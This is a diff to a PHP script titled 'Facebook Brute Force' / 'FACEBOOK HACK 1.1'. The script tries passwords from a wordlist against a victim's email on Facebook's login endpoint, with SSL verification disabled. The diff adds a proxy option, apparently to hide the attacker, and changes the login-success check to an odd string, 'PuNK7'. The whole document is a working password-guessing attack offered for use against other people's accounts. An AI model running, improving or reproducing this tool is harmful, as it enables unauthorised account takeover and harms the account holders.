@@ -14,39 +14,28 @@
     banner();
     $email = $argv[1];
     $word = $argv[2];
-
+	
+	if(isset($argv[3]) && $argv[3] == "-proxy"){
+		$proxys = $argv[4];
+		$proxy = explode(":", $proxys);
+		$sock = fsockopen($proxy[0], $proxy[1]);
+		if(!$sock){
+			echo "[-] Falha ao conectar ao proxy";
+			exit;
+		}
+	}
     function banner(){
     	
       echo "
-             ____________________________________________________
-            /                                                    \
-           |    _____________________________________________     |
-           |   |                                             |    |
-           |   |  C:\> Criado por Pablo Santhus              |    |
-           |   |       Facebook Brute Force_                 |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |                                             |    |
-           |   |_____________________________________________|    |
-           |                                                      |
-            \_____________________________________________________/
-                   \_______________________________________/
-                _______________________________________________
-             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
-          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
-       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
-    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
- _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
-:-----------------------------------------------------------------------------:
-`---._.-----------------------------------------------------------------._.---'
-        
+   ___          _____                      _ _         
+  / _ \        / ____|                    (_) |        
+ | | | |_  __ | (___   ___  ___ _   _ _ __ _| |_ _   _ 
+ | | | \ \/ /  \___ \ / _ \/ __| | | | '__| | __| | | |
+ | |_| |>  <   ____) |  __/ (__| |_| | |  | | |_| |_| |
+  \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
+                                                  __/ | 1.1
+                                                 |___/ 
+      [+] FACEBOOK HACK 1.1
       [+] Criado Por Pablo Santhus
       [+] Facebook Brute Force
       [+] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt
@@ -59,10 +48,12 @@
     	
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
-      curl_setopt($ch, CURLOPT_HEADER, true);
+      curl_setopt($ch, CURLOPT_HEADER, false);
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	  //curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
+	  //curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
       curl_setopt($ch, CURLOPT_POST, true);
       curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
       curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
@@ -73,7 +64,7 @@
       $fp = fopen("log.html", "w");
       fwrite($fp, $source);
       
-      if(eregi("facebook.com/home.php", $source)){
+      if(eregi("PuNK7", $source)){
         return true;
       }else{
         return false;
@@ -95,7 +86,7 @@
         }
       }
     }else{
-    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt";
+    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt\n";
     }
     
 ?>
